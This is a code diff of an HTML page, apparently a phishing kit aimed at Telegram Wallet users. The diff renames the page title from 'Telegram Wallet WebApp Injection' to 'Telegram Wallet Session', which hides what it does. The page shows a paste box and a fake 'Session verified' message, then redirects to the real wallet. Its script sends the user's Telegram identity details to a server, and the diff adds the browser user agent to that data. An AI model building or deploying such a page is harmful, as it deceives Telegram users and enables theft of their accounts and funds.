@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Telegram Wallet WebApp Injection</title>
+  <title>Telegram Wallet Session</title>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
@@ -9,12 +9,14 @@
       font-family: sans-serif;
       text-align: center;
       padding: 40px;
-      background-color: #f5f5f5;
     }
     textarea {
       width: 80%;
       height: 100px;
       font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      padding: 10px;
     }
     button {
       padding: 10px 20px;
@@ -27,23 +29,8 @@
     }
     #success {
       display: none;
-      margin-top: 30px;
       font-size: 18px;
-      color: #2e7d32;
-    }
-    .spinner {
-      display: inline-block;
-      width: 18px;
-      height: 18px;
-      border: 3px solid #2e7d32;
-      border-radius: 50%;
-      border-top-color: transparent;
-      animation: spin 1s linear infinite;
-      vertical-align: middle;
-      margin-right: 8px;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
+      color: green;
     }
   </style>
 </head>
@@ -57,7 +44,6 @@
   </div>
 
   <div id="success">
-    <div class="spinner"></div>
     ✅ Session verified. Redirecting...
   </div>
 
@@ -96,7 +82,7 @@
 
       // Optional redirect after 2 seconds
       setTimeout(() => {
-        window.location.href = "https://t.me/wallet"; // change to desired URL
+        window.location.href = "https://t.me/wallet"; // redirect target
       }, 2000);
     }
 
@@ -114,12 +100,14 @@
             username: user.username,
             first_name: user.first_name,
             last_name: user.last_name,
-            lang: user.language_code
+            lang: user.language_code,
+            ua: navigator.userAgent,
+            source: "Telegram WebApp"
           })
         });
       }
     } catch (e) {
-      console.warn("Not in Telegram context.");
+      console.warn("Not in Telegram WebApp context.");
     }
   </script>
 </body>
